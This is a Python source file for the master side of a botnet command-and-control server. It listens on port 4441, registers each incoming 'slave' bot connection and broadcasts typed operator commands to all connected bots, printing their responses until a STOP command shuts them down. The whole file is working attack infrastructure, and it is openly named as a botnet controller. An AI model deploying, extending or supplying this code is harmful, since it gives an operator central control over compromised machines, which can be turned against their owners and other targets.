import os
import sys
import socket
from time import sleep
from threading import Thread
flag = False
Address_List = []
clients = []
# This function is used to send the master's command to the slave
def slave_connect(clientSocket,command,ip,port):
	clientSocket.send(command.encode())
	response = clientSocket.recv(2048)
	response = response.decode("utf-8")
	print("Bot of "+ip+":"+str(port)+" response : "+response)
	print("Enter the command: ")
# Accept the connection with client and establish a thread relation
def accept_req(sock_master):
	slave_count = 0
	while flag != True:
		try:
			clientSocket, address = sock_master.accept()
			clientSocket.send(str.encode("Connected Sucessfully to Master!"))
			print("SLAVE BOTNET: " + address[0] + ":" + str(address[1]) + "connected ... \n")
			slave_count = slave_count + 1
			print("SLAVE COUNT: "+str(slave_count)+"\n")
			print("Enter the command: ")
			Address_List.append(address)
			clients.append(clientSocket)
		except socket.timeout:
			continue
sock_master = socket.socket()
host = ""
port = 4441
try:
	sock_master.bind((host, port))
except socket.error as err:
	print(str(err))
sock_master.listen(10)
sock_master.settimeout(2)
Thread(target=accept_req, args=(sock_master,)).start()
while True:
	command = input('Enter the command:\n')
	if command != "STOP":
		for i, (ip, port) in enumerate(Address_List):
			Thread(target=slave_connect, args=(clients[i],command,ip,port,)).start()
	else:
		break
flag = True
for i, (ip, port) in enumerate(Address_List):
	clients[i].send(str.encode("STOP"))
sock_master.close()
sleep(1)
sys.exit(0)
